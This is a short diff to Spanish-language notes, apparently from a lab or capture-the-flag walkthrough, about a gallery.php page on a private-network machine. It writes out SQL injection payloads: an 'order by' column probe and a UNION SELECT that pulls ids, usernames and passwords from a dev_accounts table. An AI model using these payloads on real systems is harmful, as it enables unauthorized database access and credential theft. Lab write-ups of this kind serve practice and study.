@@ -89,3 +89,5 @@ sudo /usr/local/bin/ht
 Cambiamos a 192.168.111.132 la IP por reseteo de la máquina
 GET /gallery/gallery.php?id=* # ID Vulnerable a SQL Injection
 http://192.168.111.132/gallery/gallery.php?id=1+order+by+7+--
+Vamos explorando la BBDD y sacamos usuarios y contraseñas
+/gallery/gallery.php?id=1+union select 1,+concat_ws(0x7e,id, username, password),+3,+4,+5,+6+from+dev_accounts+--+
